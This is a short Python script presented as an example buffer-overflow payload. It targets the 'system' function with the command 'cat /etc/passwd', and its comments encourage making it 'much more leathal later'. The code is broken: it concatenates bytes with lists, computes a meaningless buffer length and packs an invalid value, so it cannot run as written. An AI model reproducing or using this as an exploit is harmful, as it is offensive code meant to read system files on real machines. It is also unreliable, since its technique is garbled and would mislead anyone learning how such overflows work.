#example buffer overflow
#This is just an example, you make make this much more leathal later
import struct

# The target function and its parameters.
target_function = 'system'
target_args = ['cat /etc/passwd'] #subject to change

# Calculate the required buffer length.
buffer_len  = len(target_args) * 16 + len(target_function) + 1 
#Note!!! This is just an example of a simple bufferoverlow but you can make this however you need it.

# Create the payload in Python.
payload  = b'.' * (buffer_len - len(target_args)) + target_args + [target_function.encode()] + [b'\x00'] * 4
payload  = struct.pack('64s', payload)

print(payload)